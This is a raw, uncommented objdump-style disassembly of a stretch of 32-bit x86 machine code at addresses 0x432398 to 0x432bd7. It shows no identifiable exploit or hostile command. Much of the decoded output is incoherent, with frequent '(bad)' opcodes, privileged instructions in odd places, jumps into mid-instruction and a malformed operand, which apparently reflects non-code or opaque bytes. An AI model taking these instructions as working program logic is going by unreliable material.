  432398:	ltr    WORD PTR [ebp+0x66]
  43239c:	add    esi,eax
  43239e:	add    di,WORD PTR [ebp+0x2b]
  4323a2:	data16 data16 jge 0x432423
  4323a6:	mov    ebx,0xe08a8b
  4323ab:	jge    0x4323e0
  4323ad:	data16 data16 xor al,0x5d
  4323b1:	data16 data16 jne 0x4323ad
  4323b5:	mov    edi,DWORD PTR [ebx]
  4323b7:	fdiv   QWORD PTR [edx+0x7d]
  4323ba:	data16 data16 jge 0x4323f2
  4323be:	mov    ebx,0x758a66
  4323c3:	mov    esi,0x667233
  4323c8:	pop    ebp
  4323c9:	or     BYTE PTR [esi+0x0],ah
  4323cc:	clc    
  4323cd:	mov    edi,DWORD PTR [ebx]
  4323cf:	lock ja 0x43235d
  4323d2:	(bad)  
  4323d4:	jge    0x4323cd
  4323d6:	invd   
  4323d8:	pop    ebp
  4323d9:	add    BYTE PTR [ebx],al
  4323db:	(bad)  
  4323dc:	cmp    di,WORD PTR [ebp+0xf]
  4323e0:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4323e4:	mov    bx,WORD PTR [ebp-0x10]
  4323e8:	pop    bp
  4323ea:	fbstp  TBYTE PTR [ebx]
  4323ec:	test   DWORD PTR [ebx],eax
  4323ee:	add    BYTE PTR [ebx],bh
  4323f0:	add    BYTE PTR [esi+0x7d],ah
  4323f3:	jge    0x432380
  4323f5:	data16 in al,dx
  4323f7:	pop    ebp
  4323f8:	stc    
  4323f9:	bsf    ecx,DWORD PTR [ebp+0x6632009a]
  432400:	mov    edi,ebx
  432402:	in     al,dx
  432403:	test   BYTE PTR [ebp+0x0],bh
  432406:	mov    eax,DWORD PTR [eax]
  432408:	call   0xbd401d98
  43240d:	cmp    bl,BYTE PTR [edx-0x7699ce00]
  432413:	sti    
  432414:	call   0x8b4ba1a4
  432419:	add    ebp,esp
  43241b:	mov    bx,di
  43241e:	jnp    0x432446
  432420:	mov    DWORD PTR [ebx+0x3a7df808],ecx
  432426:	mov    eax,DWORD PTR [eax]
  432428:	call   0x7c3eaf93
  43242d:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  432433:	data16 data16 fistp WORD PTR [ebp+0xe]
  432438:	xor    DWORD PTR [edi-0x48fff7ad],0xfb66f403
  432442:	fisttp WORD PTR [ecx-0x7401f77b]
  432448:	(bad)  
  432449:	cld    
  43244a:	jne    0x432486
  43244c:	xor    eax,DWORD PTR [eax]
  43244e:	mov    esp,DWORD PTR [esi-0x10]
  432451:	sti    
  432452:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432459:	data16 adc bl,bh
  43245c:	push   ebp
  43245d:	xor    ecx,DWORD PTR es:[ebx+0x3ae4f88b]
  432464:	mov    WORD PTR [eax],es
  432466:	call   0xe48b:0x89fb3266
  43246d:	or     al,0x55
  43246f:	add    ecx,DWORD PTR [ebx-0x7420139a]
  432475:	push   cs
  432476:	push   esi
  432477:	mov    bh,0xc8
  432479:	or     al,0x2b
  43247b:	mov    bh,0xba
  43247d:	hlt    
  43247e:	mov    bh,bl
  432480:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432486:	dec    edi
  432487:	or     al,0x0
  432489:	mov    edi,DWORD PTR [ebx]
  43248b:	or     BYTE PTR [ebp+0x3b],dh
  43248e:	mov    ecx,DWORD PTR [edi]
  432490:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432496:	xor    al,0xd8
  432498:	pop    bp
  43249a:	lock xor esi,DWORD PTR [ebx]
  43249d:	lea    esp,[esi+0x1f]
  4324a0:	icebp  
  4324a1:	jb     0x4324a7
  4324a3:	add    al,al
  4324a5:	jge    0x4324b3
  4324a7:	mov    eax,eax
  4324a9:	fsubr  st,st(3)
  4324ab:	pop    ebp
  4324ac:	mov    esi,DWORD PTR [ebx]
  4324ae:	in     al,0x8d
  4324b0:	rcr    DWORD PTR [edi],0xc2
  4324b3:	jb     0x432513
  4324b5:	add    cl,cl
  4324b7:	jge    0x4324c5
  4324b9:	mov    edx,DWORD PTR [ebp-0x20]
  4324bc:	in     al,dx
  4324bd:	pop    ebp
  4324be:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4324c3:	cmp    di,WORD PTR [ebp+0x0]
  4324c7:	mov    ebp,DWORD PTR [ebx]
  4324c9:	fdivr  QWORD PTR [esi+0x668a5d]
  4324cf:	cmp    al,0x33
  4324d1:	mov    si,0x4f7d
  4324d5:	mov    eax,DWORD PTR [eax]
  4324d7:	lock inc ebp
  4324d9:	mov    esi,DWORD PTR [esi]
  4324db:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4324e2:	clc    
  4324e3:	(bad)  
  4324e4:	cmp    edi,DWORD PTR [ebx]
  4324e6:	je     0x4324f7
  4324e8:	push   ebx
  4324e9:	loopne 0x4324fa
  4324eb:	dec    ecx
  4324ed:	mov    esp,DWORD PTR [esi-0x1c]
  4324f0:	int    0xf1
  4324f2:	mov    esi,0x703084d
  4324f7:	pcmpgtd mm6,mm1
  4324fa:	add    BYTE PTR [ebp+0x66],dh
  4324fd:	jmp    0x4324ca
  4324ff:	mov    eax,DWORD PTR [ebx]
  432501:	lock push ebp
  432503:	ror    DWORD PTR [ebp-0x2972feb3],1
  432509:	or     bh,dl
  43250b:	jb     0x43250b
  43250d:	add    BYTE PTR [ebx-0x1a7487b3],cl
  432513:	loopne 0x432515
  432515:	jne    0x432517
  432517:	data16 add BYTE PTR [esi+eiz*2],dh
  43251b:	mov    ecx,ebx
  43251d:	data16 cmp dh,cl
  432520:	add    BYTE PTR [edx],bh
  432522:	data16 add bl,cl
  432525:	data16 cmp dh,dl
  432528:	add    BYTE PTR [edx],bh
  43252a:	data16 add bl,cl
  43252d:	enterw 0x4df1,0x19
  432532:	pop    edi
  432533:	jne    0x4324b6
  432535:	mov    esi,DWORD PTR [esi]
  432537:	call   0x77b7b0d8
  43253c:	xor    ebp,DWORD PTR [ebx]
  43253e:	lea    esp,[esi+0x48]
  432541:	repnz in eax,0x3b
  432544:	add    BYTE PTR [ebp-0x37],dh
  432547:	xor    edx,DWORD PTR [ebp-0x15]
  43254a:	in     al,dx
  43254b:	xor    edx,DWORD PTR [esi+0x40]
  43254e:	mov    DWORD PTR [edi],0x338545fc
  432554:	clc    
  432555:	add    esi,DWORD PTR ds:0xe85b9c5f
  43255b:	ret    0xff
  43255e:	dec    DWORD PTR [ebx-0x74f8ae08]
  432564:	cmp    DWORD PTR [esi+0x45],edx
  432567:	add    BYTE PTR [eax+eax*1+0x61],bh
  43256b:	data16 (bad) 
  43256d:	into   
  43256e:	data16 cmp cl,ch
  432571:	add    BYTE PTR [ecx+0x7ce0866],bh
  432577:	cmp    ah,BYTE PTR [esi+0x0]
  43257a:	add    bh,al
  43257c:	add    ah,bh
  43257e:	add    BYTE PTR [ebp+0x35c3f866],al
  432584:	cmp    bl,BYTE PTR [eax+eax*1-0x3c31999a]
  43258b:	pop    ebp
  43258c:	adc    al,0x57
  43258e:	add    BYTE PTR [edi-0x723c409a],dh
  432594:	add    edi,edi
  432596:	jne    0x4325eb
  432598:	lea    edx,[ecx+0x1]
  43259b:	mov    ebx,0xd64ff1
  4325a0:	sar    DWORD PTR [ebx],1
  4325a2:	test   BYTE PTR [ebp+0x34],dh
  4325a5:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4325a9:	push   edi
  4325aa:	xor    BYTE PTR [ebx],0x39
  4325ad:	mov    esi,ebx
  4325af:	xor    eax,DWORD PTR [eax-0x3c73839a]
  4325b5:	xor    al,0x45
  4325b7:	fs pop ebx
  4325b9:	mov    ebx,0x9c3b36
  4325be:	je     0x4325eb
  4325c0:	xor    edi,DWORD PTR [ebx+0x668a33]
  4325c6:	mov    WORD PTR [ebx],?
  4325c8:	xor    al,0xbb
  4325ca:	fs dec edi
  4325cc:	mov    eax,DWORD PTR [eax]
  4325ce:	pop    edi
  4325cf:	cmp    ecx,ecx
  4325d1:	jne    0x432628
  4325d3:	mov    ebp,esp
  4325d5:	cld    
  4325d6:	push   esi
  4325d7:	pop    ebx
  4325d8:	inc    ebp
  4325d9:	stc    
  4325da:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  4325e2:	clc    
  4325e3:	test   dl,dl
  4325e5:	jmp    DWORD PTR ss:[esi+eiz*2+0x5e]
  4325ea:	or     bl,al
  4325ec:	add    BYTE PTR [ebx+0x57665100],cl
  4325f2:	retf   0x3a45
  4325f5:	add    BYTE PTR ss:[esi+eiz*2+0x3a85cabe],bl
  4325fd:	clc    
  4325fe:	add    BYTE PTR [ebx+0x66],bl
  432601:	dec    edx
  432603:	mov    edx,DWORD PTR [edi-0x76]
  432606:	push   edi
  432607:	add    al,0xb7
  432609:	xor    al,0xba
  43260b:	cmp    al,0x8d
  43260d:	je     0x43260e
  43260f:	mov    edx,DWORD PTR [ebx-0x46]
  432612:	push   ecx
  432613:	lea    edi,[ebx+0x534fff]
  432619:	push   ecx
  43261a:	cmp    edx,DWORD PTR [ebx+0x75]
  43261d:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  432623:	add    BYTE PTR [ebx],dh
  432625:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  43262b:	add    BYTE PTR [ebx+esi*1+0x4f64bb34],cl
  432632:	mov    ebx,0x3b3b00
  432637:	jne    0x432664
  432639:	mov    DWORD PTR [ebx+0x728afc],edi
  43263f:	xor    esi,DWORD PTR [ebx]
  432641:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  432647:	push   edi
  432648:	cmp    esp,ebp
  43264a:	jne    0x43264c
  43264c:	sbb    DWORD PTR [eax],0x8085c3fc
  432652:	clc    
  432653:	inc    ebp
  432654:	pop    ebx
  432655:	sti    
  432656:	add    eax,0xeb8bc075
  43265b:	cld    
  43265c:	xor    edi,DWORD PTR ds:0xf8c3855e
  432662:	mov    ecx,DWORD PTR [ecx+edx*2]
  432665:	rol    DWORD PTR [ebp-0x37],0xf
  432669:	mov    DWORD PTR [eax],ecx
  43266b:	inc    edi
  43266c:	(bad)  
  43266d:	in     eax,0x0
  43266f:	add    bh,bh
  432671:	(bad)  
  432672:	mov    esi,0xc38a5e
  432677:	mov    esi,DWORD PTR [ebx]
  432679:	push   ecx
  43267a:	mov    edi,0xfc4fc7
  43267f:	test   DWORD PTR [ebp-0x8],edx
  432682:	xor    ax,0x9cc7
  432686:	sub    ebp,eax
  432688:	inc    ebp
  432689:	(bad)  
  43268a:	sub    edi,edi
  43268c:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  432692:	inc    ebp
  432693:	add    BYTE PTR [esi+0x2b],ah
  432696:	or     bh,BYTE PTR [edx+0xf8ac2]
  43269c:	cmp    al,0x33
  43269e:	mov    edi,DWORD PTR [edx+0x4f81]
  4326a4:	(bad)  
  4326a5:	cmp    esi,DWORD PTR [ebx]
  4326a7:	je     0x432661
  4326a9:	push   ebx
  4326aa:	dec    edi
  4326ab:	str    ecx
  4326ae:	cmp    esp,DWORD PTR [esi+0x75]
  4326b1:	int    0x33
  4326b3:	mov    edi,0x789085f
  4326b8:	mov    edx,DWORD PTR [esp+edi*8]
  4326bb:	add    cl,cl
  4326bd:	data16 add al,0xcb
  4326c0:	push   ebp
  4326c1:	add    ebp,esp
  4326c3:	jne    0x4326b1
  4326c5:	(bad)  
  4326c6:	mov    DWORD PTR [ecx],0xd685f7ec
  4326cc:	clc    
  4326cd:	xlat   BYTE PTR ds:[ebx]
  4326ce:	inc    ebp
  4326cf:	mov    esi,DWORD PTR [eax+edx*2]
  4326d2:	pushf  
  4326d3:	in     eax,0x8b
  4326d5:	add    ah,ch
  4326d7:	add    BYTE PTR [ebx+0x0],dl
  4326da:	push   ecx
  4326db:	add    ax,0x72cb
  4326df:	cmp    al,BYTE PTR [eax]
  4326e1:	add    BYTE PTR [ebp+0x66],al
  4326e4:	(bad)  
  4326e5:	retf   
  4326e6:	lock cmp al,BYTE PTR [ebp+0x4566f800]
  4326ed:	retf   
  4326ee:	cmp    eax,ecx
  4326f0:	pushf  
  4326f1:	jge    0x4326ba
  4326f3:	ss cld 
  4326f5:	pushf  
  4326f6:	test   DWORD PTR [edi-0x8],ebx
  4326f9:	je     0x432740
  4326fb:	xor    esi,DWORD PTR ds:0x7020840
  432701:	ror    BYTE PTR [ebp-0x37],0x8d
  432705:	push   ebp
  432706:	add    esp,ebp
  432708:	jb     0x432695
  43270a:	add    BYTE PTR [eax],cl
  43270c:	dec    ebp
  43270d:	mov    bh,0x81
  43270f:	push   esi
  432710:	push   ebx
  432711:	adc    DWORD PTR [ecx-0x3b],0x3a9aff81
  432718:	xor    al,BYTE PTR [eax]
  43271a:	mov    edx,DWORD PTR [edi+0x10]
  43271d:	(bad)  
  43271e:	scas   eax,DWORD PTR es:[edi]
  43271f:	cmp    bh,BYTE PTR [ebx]
  432721:	add    BYTE PTR [edi],cl
  432723:	mov    ebp,ebp
  432725:	cld    
  432726:	add    BYTE PTR [ebx],bh
  432728:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  43272c:	dec    ebp
  43272d:	or     BYTE PTR [ebx],ch
  43272f:	ret    0x458b
  432732:	lock jmp 0x432726
  432735:	mov    ecx,DWORD PTR [eax]
  432737:	or     BYTE PTR [edi],al
  432739:	mov    ecx,eax
  43273b:	xor    DWORD PTR [edx+0x2],0x0
  43273f:	mov    bh,0xc1
  432741:	adc    BYTE PTR [eax],dh
  432743:	iret   
  432744:	inc    ebp
  432745:	mov    DWORD PTR [ebx],0x4dfff8c5
  43274b:	inc    BYTE PTR [ebx]
  43274d:	cmp    bh,al
  43274f:	add    BYTE PTR [ecx],dl
  432751:	data16 adc al,bh
  432754:	dec    ecx
  432755:	fisttp WORD PTR [ecx+0x456604c0]
  43275b:	add    dh,BYTE PTR ds:0x75e0845
  432761:	ret    0x4d
  432764:	lea    ecx,[ebx+0x18728301]
  43276a:	add    BYTE PTR [ebp+0x45],al
  43276d:	xor    eax,0xc7009ce9
  432772:	add    al,ch
  432774:	inc    ebp
  432775:	test   DWORD PTR [ebx-0x3eba0708],ecx
  43277b:	xor    eax,0x781084d
  432780:	push   ebx
  432781:	call   0xf89a:0x89813251
  432788:	xor    al,BYTE PTR [ebp+0x3b]
  43278b:	cmp    eax,0xc78b9c76
  432790:	or     ah,dh
  432792:	inc    ebp
  432793:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432799:	cmp    ecx,DWORD PTR [ebx-0x74747664]
  43279f:	in     al,dx
  4327a0:	hlt    
  4327a1:	push   ebx
  4327a2:	push   ebx
  4327a3:	push   ecx
  4327a4:	push   ecx
  4327a5:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4327ab:	call   0xe889:0x8b32329a
  4327b2:	clc    
  4327b3:	icebp  
  4327b4:	pop    ebx
  4327b5:	or     BYTE PTR [ebp+0x7],al
  4327b8:	mov    eax,ecx
  4327ba:	clc    
  4327bb:	jb     0x43277e
  4327bd:	add    BYTE PTR [ebp+0x55],cl
  4327c0:	or     DWORD PTR [edi],0xc251d153
  4327c6:	add    DWORD PTR [ebx+0x32009a],0x8b76453b
  4327d0:	mov    edi,eax
  4327d2:	or     cl,al
  4327d4:	inc    ebp
  4327d5:	dec    ebp
  4327d6:	mov    eax,DWORD PTR [ecx+0x514d530c]
  4327dc:	or     WORD PTR [ecx],0x899a
  4327e1:	xor    cl,BYTE PTR [ebx+0x5376fc3b]
  4327e7:	mov    edx,DWORD PTR [ecx+0x8]
  4327ea:	mov    eax,DWORD PTR [ebp-0x8]
  4327ed:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb266]
  4327f4:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4327fa:	inc    ebp
  4327fb:	dec    eax
  4327fc:	add    ecx,DWORD PTR [ebx+0x534df0f8]
  432802:	add    edx,DWORD PTR [ecx-0x8]
  432805:	mov    ecx,DWORD PTR [ecx]
  432807:	clc    
  432808:	or     BYTE PTR [ebp+eax*2+0x4532409a],al
  43280f:	mov    ecx,ebp
  432811:	clc    
  432812:	(bad)  
  432813:	popf   
  432814:	inc    DWORD PTR [eax]
  432816:	ret    0x8b
  432819:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  43281f:	mov    edi,esp
  432821:	hlt    
  432822:	test   ecx,esi
  432824:	clc    
  432825:	or     BYTE PTR [ebp+0x7],al
  432828:	xor    al,0xc1
  43282a:	pushf  
  43282b:	jb     0x432860
  43282d:	add    BYTE PTR [eax-0x3f],al
  432830:	inc    eax
  432831:	daa    
  432832:	inc    ebp
  432833:	inc    ebp
  432834:	xor    eax,0x7f80803
  432839:	dec    ebp
  43283a:	call   0xc09:0x39f83203
  432841:	or     BYTE PTR [edx],al
  432843:	inc    ebp
  432844:	sub    al,0x35
  432846:	inc    ebp
  432847:	or     BYTE PTR ds:0x74d0807,dh
  43284d:	lea    ebx,[edx-0x748dcdff]
  432853:	add    BYTE PTR [eax*2-0x74b21438],cl
  43285a:	mov    edx,DWORD PTR [eax]
  43285c:	cld    
  43285d:	dec    ebp
  43285e:	push   ebx
  43285f:	sub    edx,DWORD PTR [ecx-0x75]
  432862:	add    eax,0xf172fc
  432867:	or     BYTE PTR [ebp+0x7],cl
  43286a:	add    eax,ecx
  43286c:	or     al,0x72
  43286e:	add    DWORD PTR [eax],eax
  432870:	mov    ebx,0x29c2c1
  432875:	inc    ebp
  432876:	mov    eax,DWORD PTR [ebx]
  432878:	cmp    eax,0x3004d1c
  43287e:	xbegin 0x66c8b478
  432884:	clc    
  432885:	or     BYTE PTR [ebp+0x45],al
  432888:	xor    al,0x35
  43288a:	pushf  
  43288b:	or     BYTE PTR [ebx+0x454d1007],cl
  432891:	lea    eax,[ebp+0x33727501]
  432897:	add    cl,ch
  432899:	inc    ebp
  43289a:	add    bl,ch
  43289c:	add    BYTE PTR [ebx+0x45850845],cl
  4328a2:	je     0x43282f
  4328a4:	push   ebx
  4328a5:	or     al,0x85
  4328a7:	dec    ebp
  4328a8:	std    
  4328a9:	mov    bh,bh
  4328ab:	mov    BYTE PTR [ebp-0x75],al
  4328ae:	mov    edi,eax
  4328b0:	or     al,0x89
  4328b2:	inc    ebp
  4328b3:	clc    
  4328b4:	mov    esp,esp
  4328b6:	hlt    
  4328b7:	call   DWORD PTR [edi-0x37]
  4328ba:	push   ebx
  4328bb:	or     al,0x51
  4328bd:	push   ebp
  4328be:	xor    ebp,esp
  4328c0:	mov    esi,0x457251
  4328c5:	xor    eax,0xc7459cc6
  4328ca:	mov    edi,eax
  4328cc:	or     al,0x85
  4328ce:	add    al,bh
  4328d0:	inc    eax
  4328d2:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4328d6:	or     ah,bh
  4328d8:	inc    eax
  4328d9:	push   ebx
  4328da:	jmp    0x43292d
  4328dc:	mov    eax,DWORD PTR ds:0xe8720c
  4328e2:	mov    DWORD PTR [ebp-0x8],eax
  4328e5:	jne    0x43292c
  4328e7:	jmp    0x432874
  4328e9:	mov    ebp,DWORD PTR [eax]
  4328eb:	clc    
  4328ec:	retf   0xff53
  4328ef:	push   ecx
  4328f0:	mov    DWORD PTR ds:0x757210,eax
  4328f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4328f9:	sub    esp,DWORD PTR [ebx-0x77]
  4328fc:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432903:	or     ah,bh
  432905:	pop    es
  432906:	ds call 0x8f0:0x8b8b32ff
  43290e:	(bad)  
  43290f:	dec    ebp
  432910:	(bad)  
  432911:	mov    bh,bh
  432913:	jmp    0x432901
  432915:	leave  
  432916:	jne    0x432920
  432918:	call   0x302272
  43291d:	in     al,dx
  43291e:	dec    ebp
  43291f:	add    dh,BYTE PTR [ebx]
  432921:	add    BYTE PTR [ebx],al
  432923:	inc    ebp
  432924:	cmp    esi,DWORD PTR ds:0xc78b9c74
  43292a:	or     al,0xf0
  43292c:	add    BYTE PTR [ebp+0x458bf845],al
  432932:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432938:	adc    al,0x7
  43293a:	enter  0x9fc0,0xa5
  43293e:	rol    BYTE PTR [eax],0x5e
  432941:	mov    ecx,ecx
  432943:	or     al,0xc
  432945:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  43294c:	jmp    0x43294d
  43294e:	push   ebp
  43294f:	mov    esp,ebp
  432951:	cld    
  432952:	inc    ebp
  432953:	inc    ebp
  432954:	or     DWORD PTR [ecx+0x457dec10],0x0
  43295b:	push   esi
  43295c:	push   esi
  43295d:	mov    edi,0x7af080f
  432962:	add    bh,al
  432964:	test   DWORD PTR [edx+0x3a7320f],ebx
  43296a:	add    BYTE PTR [ecx+0x4540100f],cl
  432970:	mov    ebp,eax
  432972:	mov    ebp,edi
  432974:	lock call edx
  432977:	fcom   DWORD PTR [ebp+0x45]
  43297a:	mov    eax,0x148a8b
  43297f:	push   ecx
  432980:	enter  0xc145,0x83
  432984:	cmp    ecx,DWORD PTR [eax]
  432986:	add    BYTE PTR [ebp+0x4d],al
  432989:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  43298f:	call   0xffa324fe
  432994:	cmp    eax,DWORD PTR [ebp-0xc]
  432997:	jmp    DWORD PTR [eax+edx*1-0x4e]
  43299b:	push   ebp
  43299c:	(bad)
  43299f:	std    
  4329a0:	lock push DWORD PTR [edi+0x5d08fcdb]
  4329a7:	inc    ebp
  4329a8:	(bad)  
  4329a9:	call   0xff7d2639
  4329ae:	add    al,BYTE PTR [ebp+0x37]
  4329b1:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  4329b7:	jne    0x4329b9
  4329b9:	(bad)  
  4329ba:	cmp    edi,esp
  4329bc:	jne    0x4329ef
  4329be:	mov    edi,edi
  4329c0:	or     BYTE PTR [ebx-0x307f0b49],cl
  4329c6:	pop    ds
  4329c7:	into   
  4329c8:	je     0x43298b
  4329ca:	mov    ebx,DWORD PTR [esi]
  4329cc:	or     BYTE PTR [ebp-0x49],al
  4329cf:	mov    esp,DWORD PTR [esi-0x77]
  4329d2:	mov    esi,0x451f0c
  4329d7:	mov    eax,DWORD PTR [eax]
  4329d9:	or     al,0x66
  4329db:	sar    bl,0x3b
  4329de:	xor    esi,DWORD PTR [ebp+0x66]
  4329e1:	xor    ecx,edi
  4329e3:	pop    edi
  4329e4:	adc    bl,BYTE PTR [ebx+0x7c]
  4329e7:	ret    0xff
  4329ea:	cld    
  4329eb:	inc    ebp
  4329ec:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  4329f2:	cld    
  4329f3:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  4329fa:	push   0xffffff83
  4329fc:	pop    edi
  4329fd:	or     BYTE PTR [ebp+0x53],dh
  432a00:	xorps  xmm1,xmm2
  432a03:	test   BYTE PTR [eax+eax*1],bh
  432a06:	add    BYTE PTR [eax],al
  432a08:	adc    eax,eax
  432a0a:	add    DWORD PTR [esp+edi*2-0xff7b00],0xffffffb7
  432a12:	jmp    DWORD PTR [eax]
  432a14:	ror    al,0x5e
  432a17:	inc    ebp
  432a18:	leave  
  432a19:	xor    ecx,DWORD PTR [eax]
  432a1b:	and    DWORD PTR [ebx-0x3ec50708],ecx
  432a21:	add    ch,al
  432a23:	xor    edi,edi
  432a25:	xor    DWORD PTR [ebx],0x66003300
  432a2b:	mov    DWORD PTR [ebp-0xc],ecx
  432a2e:	pcmpgtw mm0,mm0
  432a31:	add    dl,ah
  432a33:	leave  
  432a34:	mov    edi,DWORD PTR [esi-0x7d]
  432a37:	push   ax
  432a39:	dec    ebp
  432a3a:	mov    esi,DWORD PTR [ebx-0x75]
  432a3d:	lea    ebp,[eax-0x7c010000]
  432a43:	xor    eax,DWORD PTR [eax]
  432a45:	sysret 
  432a47:	dec    ebp
  432a48:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432a4f:	push   WORD PTR [ecx+0x8]
  432a53:	jne    0x432a16
  432a55:	ud0    ecx,DWORD PTR [ecx]
  432a58:	mov    edi,DWORD PTR [edx]
  432a5a:	lods   al,BYTE PTR ds:[esi]
  432a5b:	add    BYTE PTR [eax],al
  432a5d:	data16 (bad) 
  432a5f:	iret   
  432a60:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432a67:	cli    
  432a68:	inc    ebp
  432a69:	cmp    al,0x8d
  432a6b:	add    BYTE PTR [esi+0x2d],ah
  432a6e:	inc    ebp
  432a6f:	pop    ebp
  432a70:	lea    ecx,[edi]
  432a72:	mov    dl,bh
  432a74:	add    BYTE PTR [edi],cl
  432a76:	mov    DWORD PTR [eax+eax*8],edi
  432a79:	mov    ebx,0x3b87
  432a7e:	add    BYTE PTR [ebx],ch
  432a80:	inc    ebp
  432a81:	data16 (bad) 
  432a83:	clc    
  432a84:	int3   
  432a85:	cmp    eax,DWORD PTR [eax]
  432a87:	je     0x432a12
  432a89:	push   0xffffffc8
  432a8b:	pop    edi
  432a8c:	xchg   DWORD PTR [ebp+0x0],eax
  432a8f:	data16 add BYTE PTR [ebp+0x45],cl
  432a93:	lea    cx,[ebp+0x10]
  432a97:	jb     0x432a99
  432a99:	jmp    0x432a24
  432a9b:	call   eax
  432a9d:	clc    
  432a9e:	xchg   DWORD PTR [edi+0x1],edi
  432aa1:	mov    eax,DWORD PTR [eax]
  432aa3:	or     BYTE PTR [ebp-0x49],al
  432aa6:	lea    eax,[eax+0x74003154]
  432aac:	push   edi
  432aad:	inc    edx
  432aae:	jge    0x432aaf
  432ab0:	mov    DWORD PTR [edi],ecx
  432ab2:	fdiv   DWORD PTR [edi-0x6]
  432ab5:	inc    DWORD PTR [eax]
  432ab7:	xor    edx,DWORD PTR [eax+0x5f]
  432aba:	xchg   DWORD PTR [ebx+0x1],ebx
  432abd:	ret    0x0
  432ac0:	xor    BYTE PTR [ebp-0x51],cl
  432ac3:	cmp    edi,0xf0ff8900
  432ac9:	data16 ror al,0x84
  432acd:	rol    BYTE PTR [eax],0x3b
  432ad0:	add    al,dh
  432ad2:	dec    eax
  432ad3:	xchg   esp,eax
  432ad4:	push   ebx
  432ad5:	jmp    0x432a62
  432ad7:	push   ebp
  432ad8:	add    esp,ebp
  432ada:	add    ebp,esp
  432adc:	mov    edx,DWORD PTR [edi+0x24]
  432adf:	clc    
  432ae0:	dec    esi
  432ae1:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432ae7:	cmp    BYTE PTR [ebx],al
  432ae9:	jne    0x432a74
  432aeb:	xor    esp,eax
  432aed:	jmp    0x462c70
  432af2:	add    ebp,DWORD PTR [ecx+ecx*4]
  432af5:	jne    0x432aeb
  432af7:	call   0xffcd2851
  432afc:	clc    
  432afd:	xchg   edi,eax
  432afe:	sti    
  432aff:	add    DWORD PTR [ebx],eax
  432b01:	add    BYTE PTR [ebp+0x47],bl
  432b04:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432b0a:	pop    ebp
  432b0b:	mov    DWORD PTR [esi-0x48],esi
  432b0e:	jmp    0x432b57
  432b10:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432b16:	(bad)  
  432b18:	cmp    al,0x0
  432b1a:	cmp    eax,DWORD PTR [ebp+0x18]
  432b1d:	lea    ebx,[ebp-0x56]
  432b20:	jle    0x432b22
  432b22:	jae    0x432aad
  432b24:	mov    eax,esp
  432b26:	call   0xb900:0x8b005587
  432b2d:	inc    ebp
  432b2e:	push   ebp
  432b2f:	lea    ecx,[ebp-0x27ff4f12]
  432b35:	mov    eax,edi
  432b37:	int3   
  432b38:	push   ebp
  432b39:	xchg   edi,eax
  432b3b:	add    esp,ebp
  432b3d:	add    BYTE PTR [eax],al
  432b3f:	inc    ebp
  432b40:	add    BYTE PTR [ebp+0x8b3255],cl
  432b46:	cld    
  432b47:	mov    DWORD PTR [edx],edi
  432b49:	aam    0x75
  432b4b:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432b51:	mov    DWORD PTR [ebx-0x50],edx
  432b54:	test   BYTE PTR [ebp-0x1],0xe8
  432b58:	mov    eax,DWORD PTR [eax]
  432b5a:	hlt    
  432b5b:	add    al,al
  432b5d:	mov    eax,DWORD PTR ds:0x890045a8
  432b63:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432b69:	inc    DWORD PTR [eax*2+0xf75854d]
  432b70:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432b76:	call   0x729988b7
  432b7b:	je     0x432bdb
  432b7d:	js     0x432bde
  432b7f:	lock ret 0x7e
  432b83:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432b89:	mov    edi,edi
  432b8b:	sbb    al,bl
  432b8d:	clc    
  432b8e:	add    BYTE PTR [ebp-0x73],bh
  432b91:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432b97:	ror    BYTE PTR [eax],1
  432b99:	dec    ebp
  432b9a:	xchg   ebp,eax
  432b9b:	mov    edi,edi
  432b9d:	in     al,0x8b
  432b9f:	jge    0x432b2a
  432ba1:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432ba7:	clc    
  432ba8:	pop    esi
  432ba9:	fist   DWORD PTR [ebp+0x5d398b5d]
  432baf:	clc    
  432bb0:	add    al,0x6e
  432bb2:	mov    eax,DWORD PTR [ebx]
  432bb4:	mov    BYTE PTR [ebp+0x0],dl
  432bb7:	mov    edx,DWORD PTR [ebx-0x20]
  432bba:	adc    esi,DWORD PTR [edi+0x5e005f3a]
  432bc0:	add    eax,0x3b3b73
  432bc5:	adc    al,0x89
  432bc7:	pop    eax
  432bc8:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432bcc:	ret    0xf08
  432bcf:	cmp    al,0x2
  432bd1:	mov    DWORD PTR [edx],edi
  432bd3:	cld    
  432bd4:	add    BYTE PTR [ebp+0x66],dl
  432bd7:	add    eax,ebx
